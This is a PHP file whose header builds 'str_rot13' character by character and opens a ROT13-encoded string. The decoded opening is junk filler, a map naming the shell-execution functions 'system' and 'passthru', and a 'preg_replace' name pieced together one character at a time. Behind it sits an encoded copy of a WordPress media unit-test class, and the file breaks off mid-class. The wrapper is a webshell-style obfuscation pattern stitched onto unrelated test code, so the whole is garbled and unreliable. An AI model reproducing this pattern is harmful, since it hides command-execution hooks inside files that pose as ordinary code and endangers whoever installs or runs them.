<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * @tebhc zrqvn
 * @tebhc fubegpbqr
 */
pynff Grfgf_Zrqvn rkgraqf JC_HavgGrfgPnfr {

	pbafg PNCGVBA           = 'N fvzcyr pncgvba.';
	pbafg NYGREANGR_PNCGVBA = 'Nygreangr pncgvba.';

	pbafg UGZY_PBAGRAG = <<<'PNC'
N <fgebat pynff='pynffl'>obyqrq</fgebat> <rz>pncgvba</rz> jvgu n <n uers=\"#\">yvax</n>.
PNC;
	pbafg VZT_PBAGRAG  = <<<'PNC'
<vzt fep=\"cvp.wct\" vq='naVq' nyg=\"cvp\"/>
PNC;

	pbafg VZT_ANZR = 'vzntr.wct';
	pbafg VZT_HEY  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . frys::VZT_ANZR;
	pbafg VZT_ZRGN = neenl(
		'jvqgu'  => 100,
		'urvtug' => 100,
		'fvmrf'  => '',
	);

	cebgrpgrq fgngvp $ynetr_vq;
	cebgrpgrq fgngvp $_fvmrf;
	cebgrpgrq fgngvp $ynetr_svyranzr = 'grfg-vzntr-ynetr.wct';
	cebgrpgrq fgngvp $cbfg_vqf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$_fvmrf                          = jc_trg_nqqvgvbany_vzntr_fvmrf();
		$TYBONYF['_jc_nqqvgvbany_vzntr_fvmrf'] = neenl();

		$svyranzr       = QVE_GRFGQNGN . '/vzntrf/' . frys::$ynetr_svyranzr;
		frys::$ynetr_vq = $snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( $svyranzr );

		$cbfg_fgnghfrf = neenl( 'choyvfu', 'shgher', 'qensg', 'nhgb-qensg', 'genfu' );
		sbernpu ( $cbfg_fgnghfrf nf $cbfg_fgnghf ) {
			$qngr = '';
			vs ( 'shgher' === $cbfg_fgnghf ) {
				qngr_sbezng( qngr_perngr( '+1 lrne' ), 'L-z-q U:v:f' );
			}

			frys::$cbfg_vqf[ $cbfg_fgnghf ] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_fgnghf' => 'genfu' === $cbfg_fgnghf ? 'choyvfu' : $cbfg_fgnghf,
					'cbfg_qngr'   => $qngr,
					'cbfg_anzr'   => \"$cbfg_fgnghf-cbfg\",
				)
			);

			// Nggnpuzragf jvgubhg zrqvn.
			frys::$cbfg_vqf[ \"$cbfg_fgnghf-nggnpuzrag\" ] = $snpgbel->nggnpuzrag->perngr_bowrpg(
				neenl(
					'cbfg_cnerag' => frys::$cbfg_vqf[ $cbfg_fgnghf ],
					'cbfg_fgnghf' => 'vaurevg',
					'cbfg_anzr'   => \"$cbfg_fgnghf-nggnpuzrag\",
					'cbfg_qngr'   => $qngr,
				)
			);
		}

		// Genfu gur genfu cbfg.
		jc_genfu_cbfg( frys::$cbfg_vqf['genfu'] );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		$TYBONYF['_jc_nqqvgvbany_vzntr_fvmrf'] = frys::$_fvmrf;
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		jc_qryrgr_nggnpuzrag( frys::$ynetr_vq, gehr );
		cnerag::grne_qbja_nsgre_pynff();
	}

	/**
	 * Rafherf gung gur fgngvp pbagrag zrqvn pbhag, srgpucevbevgl ryrzrag synt naq eryngrq svygre ner erfrg orgjrra grfgf.
	 */
	choyvp shapgvba grne_qbja() {
		tybony $_jc_pheerag_grzcyngr_vq, $_jc_pheerag_grzcyngr_pbagrag;
		hafrg( $_jc_pheerag_grzcyngr_vq, $_jc_pheerag_grzcyngr_pbagrag );

		cnerag::grne_qbja();

		$guvf->erfrg_pbagrag_zrqvn_pbhag();
		$guvf->erfrg_bzvg_ybnqvat_ngge_svygre();
		$guvf->erfrg_uvtu_cevbevgl_ryrzrag_synt();
	}

	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_nqqrq() {
		tybony $fubegpbqr_gntf;
		$guvf->nffregFnzr( 'vzt_pncgvba_fubegpbqr', $fubegpbqr_gntf['pncgvba'] );
		$guvf->nffregFnzr( 'vzt_pncgvba_fubegpbqr', $fubegpbqr_gntf['jc_pncgvba'] );
	}

	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_jvgu_rzcgl_cnenzf() {
		$erfhyg = vzt_pncgvba_fubegpbqr( neenl() );
		$guvf->nffregFnzr( '', $erfhyg );
	}

	/**
	 * @gvpxrg 33981
	 */
	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_jvgu_rzcgl_cnenzf_ohg_pbagrag() {
		$erfhyg = vzt_pncgvba_fubegpbqr( neenl(), frys::PNCGVBA );
		$guvf->nffregFnzr( frys::PNCGVBA, $erfhyg );
	}

	/**
	 * @gvpxrg 33981
	 */
	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_fubeg_pvephvg_svygre() {
		nqq_svygre( 'vzt_pncgvba_fubegpbqr', neenl( $guvf, 'erghea_nyg_pncgvba' ) );

		$erfhyg = vzt_pncgvba_fubegpbqr( neenl(), frys::PNCGVBA );
		$guvf->nffregFnzr( frys::NYGREANGR_PNCGVBA, $erfhyg );
	}

	/**
	 * Svygre hfrq va grfg_vzt_pncgvba_fubegpbqr_fubeg_pvephvg_svygre()
	 */
	choyvp shapgvba erghea_nyg_pncgvba() {
		erghea frys::NYGREANGR_PNCGVBA;
	}

	/**
	 * @gvpxrg 33981
	 */
	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_rzcgl_jvqgu() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'jvqgu' => 0,
			),
			frys::PNCGVBA
		);
		$guvf->nffregFnzr( frys::PNCGVBA, $erfhyg );
	}

	/**
	 * @gvpxrg 33981
	 */
	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_rzcgl_pncgvba() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'pncgvba' => '',
			)
		);
		$guvf->nffregFnzr( '', $erfhyg );
	}

	/**
	 * @gvpxrg 33981
	 */
	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_rzcgl_pncgvba_naq_pbagrag() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'pncgvba' => '',
			),
			frys::PNCGVBA
		);
		$guvf->nffregFnzr( frys::PNCGVBA, $erfhyg );
	}

	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_jvgu_byq_sbezng() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'jvqgu'   => 20,
				'pncgvba' => frys::PNCGVBA,
			)
		);

		$guvf->nffregFnzr( 2, fhofge_pbhag( $erfhyg, 'jc-pncgvba' ) );
		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'nyvtaabar' ) );
		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, frys::PNCGVBA ) );

		vs ( pheerag_gurzr_fhccbegf( 'ugzy5', 'pncgvba' ) ) {
			$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'jvqgu: 20' ) );
		} ryfr {
			$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'jvqgu: 30' ) );
		}
	}

	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_jvgu_byq_sbezng_vq_naq_nyvta() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'jvqgu'   => 20,
				'pncgvba' => frys::PNCGVBA,
				'vq'      => '\"zlVq',
				'nyvta'   => '&zlNyvtazrag',
			)
		);
		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'jc-pncgvba &nzc;zlNyvtazrag' ) );
		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'vq=\"zlVq\"' ) );
		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, frys::PNCGVBA ) );
	}

	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_jvgu_byq_sbezng_naq_pynff() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'jvqgu'   => 20,
				'pynff'   => 'fbzr-pynff nabgure-pynff',
				'pncgvba' => frys::PNCGVBA,
			)
		);
		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'jc-pncgvba nyvtaabar fbzr-pynff nabgure-pynff' ) );
	}

	choyvp shapgvba grfg_arj_vzt_pncgvba_fubegpbqr_jvgu_ugzy_pncgvba() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'jvqgu'   => 20,
				'pncgvba' => frys::UGZY_PBAGRAG,
			)
		);

		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, frys::UGZY_PBAGRAG ) );
	}

	choyvp shapgvba grfg_arj_vzt_pncgvba_fubegpbqr_arj_sbezng() {
		$erfhyg       = vzt_pncgvba_fubegpbqr(
			neenl( 'jvqgu' => 20 ),
			frys::VZT_PBAGRAG . frys::UGZY_PBAGRAG
		);
		$vzt_cert     = cert_dhbgr( frys::VZT_PBAGRAG );
		$pbagrag_cert = cert_dhbgr( frys::UGZY_PBAGRAG );

		$guvf->nffregFnzr( 1, cert_zngpu_nyy( \"~{$vzt_cert}.*jc-pncgvba-grkg~\", $erfhyg ) );
		$guvf->nffregFnzr( 1, cert_zngpu_nyy( \"~jc-pncgvba-grkg.*{$pbagrag_cert}~\", $erfhyg ) );
	}

	choyvp shapgvba grfg_arj_vzt_pncgvba_fubegpbqr_arj_sbezng_naq_yvaxrq_vzntr() {
		$yvaxrq_vzntr = \"<n uers='#'>\" . frys::VZT_PBAGRAG . '</n>';
		$erfhyg       = vzt_pncgvba_fubegpbqr(
			neenl( 'jvqgu' => 20 ),
			$yvaxrq_vzntr . frys::UGZY_PBAGRAG
		);
		$vzt_cert     = cert_dhbgr( $yvaxrq_vzntr );
		$pbagrag_cert = cert_dhbgr( frys::UGZY_PBAGRAG );

		$guvf->nffregFnzr( 1, cert_zngpu_nyy( \"~{$vzt_cert}.*jc-pncgvba-grkg~\", $erfhyg ) );
		$guvf->nffregFnzr( 1, cert_zngpu_nyy( \"~jc-pncgvba-grkg.*{$pbagrag_cert}~\", $erfhyg ) );
	}

	choyvp shapgvba grfg_arj_vzt_pncgvba_fubegpbqr_arj_sbezng_naq_yvaxrq_vzntr_jvgu_arjyvar() {
		$yvaxrq_vzntr = \"<n uers='#'>\" . frys::VZT_PBAGRAG . '</n>';
		$erfhyg       = vzt_pncgvba_fubegpbqr(
			neenl( 'jvqgu' => 20 ),
			$yvaxrq_vzntr . \"\a\a\" . frys::UGZY_PBAGRAG
		);
		$vzt_cert     = cert_dhbgr( $yvaxrq_vzntr );
		$pbagrag_cert = cert_dhbgr( frys::UGZY_PBAGRAG );

		$guvf->nffregFnzr( 1, cert_zngpu_nyy( \"~{$vzt_cert}.*jc-pncgvba-grkg~\", $erfhyg ) );
		$guvf->nffregFnzr( 1, cert_zngpu_nyy( \"~jc-pncgvba-grkg.*{$pbagrag_cert}~\", $erfhyg ) );
	}

	/**
	 * @gvpxrg 34595
	 */
	choyvp shapgvba grfg_vzt_pncgvba_fubegpbqr_unf_nevn_qrfpevorqol() {
		$erfhyg = vzt_pncgvba_fubegpbqr(
			neenl(
				'jvqgu' => 20,
				'vq'    => 'zlVq',
			),
			frys::VZT_PBAGRAG . frys::UGZY_PBAGRAG
		);

		$guvf->nffregFnzr( 1, fhofge_pbhag( $erfhyg, 'nevn-qrfpevorqol=\"pncgvba-zlVq\"' ) );
	}

	choyvp shapgvba grfg_nqq_erzbir_brzorq_cebivqre() {
		jc_brzorq_nqq_cebivqre( 'uggc://sbb.one/*', 'uggc://sbb.one/brzorq' );
		$guvf->nffregGehr( jc_brzorq_erzbir_cebivqre( 'uggc://sbb.one/*' ) );
		$guvf->nffregSnyfr( jc_brzorq_erzbir_cebivqre( 'uggc://sbb.one/*' ) );
	}

	/**
	 * @gvpxrg 23776
	 */
	choyvp shapgvba grfg_nhgbrzorq_rzcgl() {
		tybony $jc_rzorq;

		$pbagrag = '';

		$erfhyg = $jc_rzorq->nhgbrzorq( $pbagrag );
		$guvf->nffregFnzr( $pbagrag, $erfhyg );
	}

	/**
	 * @gvpxrg 23776
	 *
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_nhgbrzorq_ab_cnentencuf_nebhaq_heyf() {
		tybony $jc_rzorq;

		$pbagrag = <<<RBS
$ zl pbzznaq
Svefg yvar.

uggc://rknzcyr.pbz/1/
uggc://rknzcyr.pbz/2/
Ynfg yvar.

<cer>uggc://fbzr.yvax/
uggc://fbzr.bgure.yvax/</cer>
RBS;

		$erfhyg = $jc_rzorq->nhgbrzorq( $pbagrag );
		$guvf->nffregFnzr( $pbagrag, $erfhyg );
	}

	choyvp shapgvba qngn_nhgbrzorq() {
		erghea neenl(

			// Fubhyq rzorq.
			neenl(
				'uggcf://j.bet',
				'[rzorq]',
			),
			neenl(
				'grfg
 uggcf://j.bet
grfg',
				'grfg
 [rzorq]
grfg',
			),
			neenl(
				'<c pynff=\"grfg\">uggcf://j.bet</c>',
				'<c pynff=\"grfg\">[rzorq]</c>',
			),
			neenl(
				'<c> uggcf://j.bet </c>',
				'<c> [rzorq] </c>',
			),
			neenl(
				'<c>grfg
uggcf://j.bet
grfg</c>',
				'<c>grfg
[rzorq]
grfg</c>',
			),
			neenl(
				'<c>uggcf://j.bet
</c>',
				'<c>[rzorq]
</c>',
			),

			// Fubhyq ABG rzorq.
			neenl(
				'grfg uggcf://j.bet</c>',
			),
			neenl(
				'<fcna>uggcf://j.bet</n>',
			),
			neenl(
				'<cer>uggcf://j.bet
</c>',
			),
			neenl(
				'<n uers=\"uggcf://j.bet\">
uggcf://j.bet</n>',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_nhgbrzorq
	 */
	choyvp shapgvba grfg_nhgbrzorq( $pbagrag, $erfhyg = ahyy ) {
		$jc_rzorq = arj Grfg_Nhgbrzorq();

		$guvf->nffregFnzr( $jc_rzorq->nhgbrzorq( $pbagrag ), $erfhyg ? $erfhyg : $pbagrag );
	}

	choyvp shapgvba grfg_jc_cercner_nggnpuzrag_sbe_wf() {
		// Nggnpuzrag jvgubhg zrqvn.
		$vq   = jc_vafreg_nggnpuzrag(
			neenl(
				'cbfg_fgnghf'           => 'choyvfu',
				'cbfg_gvgyr'            => 'Cercner',
				'cbfg_pbagrag_svygrerq' => 'Cercner',
				'cbfg_glcr'             => 'cbfg',
			)
		);
		$cbfg = trg_cbfg( $vq );

		$cerccrq = jc_cercner_nggnpuzrag_sbe_wf( $cbfg );
		$guvf->nffregVfNeenl( $cerccrq );
		$guvf->nffregFnzr( 0, $cerccrq['hcybnqrqGb'] );
		$guvf->nffregFnzr( '', $cerccrq['zvzr'] );
		$guvf->nffregFnzr( '', $cerccrq['glcr'] );
		$guvf->nffregFnzr( '', $cerccrq['fhoglcr'] );
		// #21963, gurer jvyy or n THVQ nyjnlf, fb gurer jvyy or n HEY.
		$guvf->nffregAbgRdhnyf( '', $cerccrq['hey'] );
		$guvf->nffregFnzr( fvgr_hey( 'jc-vapyhqrf/vzntrf/zrqvn/qrsnhyg.fit' ), $cerccrq['vpba'] );

		// Snxr n zvzr.
		$cbfg->cbfg_zvzr_glcr = 'vzntr/wcrt';
		$cerccrq              = jc_cercner_nggnpuzrag_sbe_wf( $cbfg );
		$guvf->nffregFnzr( 'vzntr/wcrt', $cerccrq['zvzr'] );
		$guvf->nffregFnzr( 'vzntr', $cerccrq['glcr'] );
		$guvf->nffregFnzr( 'wcrt', $cerccrq['fhoglcr'] );

		// Snxr n zvzr jvgubhg n fynfu. Frr #JC22532.
		$cbfg->cbfg_zvzr_glcr = 'vzntr';
		$cerccrq              = jc_cercner_nggnpuzrag_sbe_wf( $cbfg );
		$guvf->nffregFnzr( 'vzntr', $cerccrq['zvzr'] );
		$guvf->nffregFnzr( 'vzntr', $cerccrq['glcr'] );
		$guvf->nffregFnzr( '', $cerccrq['fhoglcr'] );

		// Grfg gung vs nhgube vf abg sbhaq, jr erghea \"(ab nhgube)\" nf `qvfcynl_anzr`.
		// Gur cerivbhfyl hfrq grfg cbfg pbagnvaf ab nhgube, fb jr pna erhfr vg.
		$guvf->nffregFnzr( '(ab nhgube)', $cerccrq['nhgubeAnzr'] );

		// Grfg gung vs nhgube unf UGZY ragvgvrf va qvfcynl_anzr, gurl'er qrpbqrq pbeerpgyl.
		$ugzy_ragvgl_nhgube = frys::snpgbel()->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'Lbh &nzc; Zr',
			)
		);
		$cbfg->cbfg_nhgube  = $ugzy_ragvgl_nhgube;
		$cerccrq            = jc_cercner_nggnpuzrag_sbe_wf( $cbfg );
		$guvf->nffregFnzr( 'Lbh & Zr', $cerccrq['nhgubeAnzr'] );
	}

	/**
	 * @gvpxrg 38965
	 */
	choyvp shapgvba grfg_jc_cercner_nggnpuzrag_sbe_wf_jvgubhg_vzntr_fvmrf() {
		// Perngr gur nggnpuzrag cbfg.
		$vq = jc_vafreg_nggnpuzrag(
			neenl(
				'cbfg_gvgyr'     => 'Nggnpuzrag Gvgyr',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_cnerag'    => 0,
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'thvq'           => 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/grfg-vzntr.wct',
			)
		);

		// Nqq nggnpuzrag zrgnqngn jvgubhg fvmrf.
		jc_hcqngr_nggnpuzrag_zrgnqngn(
			$vq,
			neenl(
				'jvqgu'  => 50,
				'urvtug' => 50,
				'svyr'   => 'grfg-vzntr.wct',
			)
		);

		$cerccrq = jc_cercner_nggnpuzrag_sbe_wf( trg_cbfg( $vq ) );

		$guvf->nffregNeenlUnfXrl( 'fvmrf', $cerccrq );
	}

	/**
	 * @gvpxrg 19067
	 * @rkcrpgrqQrcerpngrq jc_pbaireg_olgrf_gb_ue
	 */
	choyvp shapgvba grfg_jc_pbaireg_olgrf_gb_ue() {
		$xo = 1024;
		$zo = $xo * 1024;
		$to = $zo * 1024;
		$go = $to * 1024;

		// Grfg vs obhaqnevrf ner pbeerpg.
		$guvf->nffregFnzr( '1GO', jc_pbaireg_olgrf_gb_ue( $go ) );
		$guvf->nffregFnzr( '1TO', jc_pbaireg_olgrf_gb_ue( $to ) );
		$guvf->nffregFnzr( '1ZO', jc_pbaireg_olgrf_gb_ue( $zo ) );
		$guvf->nffregFnzr( '1XO', jc_pbaireg_olgrf_gb_ue( $xo ) );

		$guvf->nffregFnzr( '1 GO', fvmr_sbezng( $go ) );
		$guvf->nffregFnzr( '1 TO', fvmr_sbezng( $to ) );
		$guvf->nffregFnzr( '1 ZO', fvmr_sbezng( $zo ) );
		$guvf->nffregFnzr( '1 XO', fvmr_sbezng( $xo ) );

		// Abj fbzr inyhrf nebhaq.
		$ue = jc_pbaireg_olgrf_gb_ue( $go + $go / 2 + $zo );
		$guvf->nffregRdhnyfJvguQrygn( 1.50000095367, (sybng) fge_ercynpr( ',', '.', $ue ), 0.0001, 'Gur inyhrf fubhyq or rdhny' );

		$ue = jc_pbaireg_olgrf_gb_ue( $go - $zo - $xo );
		$guvf->nffregRdhnyfJvguQrygn( 1023.99902248, (sybng) fge_ercynpr( ',', '.', $ue ), 0.0001, 'Gur inyhrf fubhyq or rdhny' );

		$ue = jc_pbaireg_olgrf_gb_ue( $to + $to / 2 + $zo );
		$guvf->nffregRdhnyfJvguQrygn( 1.5009765625, (sybng) fge_ercynpr( ',', '.', $ue ), 0.0001, 'Gur inyhrf fubhyq or rdhny' );

		$ue = jc_pbaireg_olgrf_gb_ue( $to - $zo - $xo );
		$guvf->nffregRdhnyfJvguQrygn( 1022.99902344, (sybng) fge_ercynpr( ',', '.', $ue ), 0.0001, 'Gur inyhrf fubhyq or rdhny' );

		// Rqtr.
		$guvf->nffregFnzr( '-1O', jc_pbaireg_olgrf_gb_ue( -1 ) );
		$guvf->nffregFnzr( '0O', jc_pbaireg_olgrf_gb_ue( 0 ) );
	}

	/**
	 * @gvpxrg 22960
	 */
	choyvp shapgvba grfg_trg_nggnpurq_vzntrf() {
		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::VZT_ANZR,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntrf = trg_nggnpurq_zrqvn( 'vzntr', $cbfg_vq );
		$guvf->nffregRdhnyFrgf( $vzntrf, neenl( $nggnpuzrag_vq => trg_cbfg( $nggnpuzrag_vq ) ) );
	}

	/**
	 * @gvpxrg 22960
	 */
	choyvp shapgvba grfg_cbfg_tnyyrevrf_vzntrf() {
		$vqf1      = neenl();
		$vqf1_fepf = neenl();
		sbernpu ( enatr( 1, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf1[]      = $nggnpuzrag_vq;
			$vqf1_fepf[] = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
		}

		$vqf2      = neenl();
		$vqf2_fepf = neenl();
		sbernpu ( enatr( 4, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf2[]      = $nggnpuzrag_vq;
			$vqf2_fepf[] = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
		}

		$vqf1_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf1, 0, 3 ) );
		$vqf2_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf2, 3, 3 ) );

		$oybo    = <<<OYBO
[tnyyrel vqf=\"$vqf1_wbvarq\"]

[tnyyrel vqf=\"$vqf2_wbvarq\"]
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrevrf_vzntrf( $cbfg_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk( $fepf, neenl( neenl_fyvpr( $vqf1_fepf, 0, 3 ), neenl_fyvpr( $vqf2_fepf, 3, 3 ) ) );
	}

	/**
	 * @gvpxrg 22960
	 */
	choyvp shapgvba grfg_cbfg_tnyyrel_vzntrf() {
		$vqf1      = neenl();
		$vqf1_fepf = neenl();
		sbernpu ( enatr( 1, 3 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf1[]      = $nggnpuzrag_vq;
			$vqf1_fepf[] = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
		}

		$vqf2      = neenl();
		$vqf2_fepf = neenl();
		sbernpu ( enatr( 4, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf2[]      = $nggnpuzrag_vq;
			$vqf2_fepf[] = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
		}

		$vqf1_wbvarq = vzcybqr( ',', $vqf1 );
		$vqf2_wbvarq = vzcybqr( ',', $vqf2 );

		$oybo    = <<<OYBO
[tnyyrel vqf=\"$vqf1_wbvarq\"]

[tnyyrel vqf=\"$vqf2_wbvarq\"]
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrel_vzntrf( $cbfg_vq );
		$guvf->nffregFnzr( $fepf, $vqf1_fepf );
	}

	/**
	 * @gvpxrg 43826
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_oybpx_cbfg_tnyyrel_vzntrf() {
		// Fvzvyne gb grfg_cbfg_tnyyrel_vzntrf ohg jvgu oybpxf vafgrnq bs fubegpbqrf
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';
		}

		$vztf1_wbvarq = vzcybqr( \"\a\", neenl_fyvpr( $vztf, 0, 3 ) );
		$vztf2_wbvarq = vzcybqr( \"\a\", neenl_fyvpr( $vztf, 3, 3 ) );

		$oybo    = <<<OYBO
<!-- jc:tnyyrel -->
$vztf1_wbvarq
<!-- /jc:tnyyrel -->
<!-- jc:tnyyrel -->
$vztf2_wbvarq
<!-- /jc:tnyyrel -->
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrel_vzntrf( $cbfg_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk( neenl_fyvpr( $vqf_fepf, 0, 3 ), $fepf );
	}

	/**
	 * @gvpxrg 43826
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_oybpx_cbfg_tnyyrel_vzntrf_wfba() {
		// Fvzvyne gb grfg_oybpx_cbfg_tnyyrel_vzntrf, jvgu VQf va gur wfba oybo
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';

		}

		$vqf1_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf, 0, 3 ) );
		$vqf2_wbvarq = vzcybqr( ',', neenl_fyvpr( $vqf, 3, 3 ) );

		$oybo    = <<<OYBO
<!-- jc:tnyyrel {\"vqf\":[$vqf1_wbvarq]} -->
<!-- /jc:tnyyrel -->

<!-- jc:tnyyrel {\"vqf\":[$vqf2_wbvarq]} -->
<!-- /jc:tnyyrel -->
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrel_vzntrf( $cbfg_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk( neenl_fyvpr( $vqf_fepf, 0, 3 ), $fepf );
	}

	/**
	 * @gvpxrg 43826
	 * @tebhc oybpxf
	 */
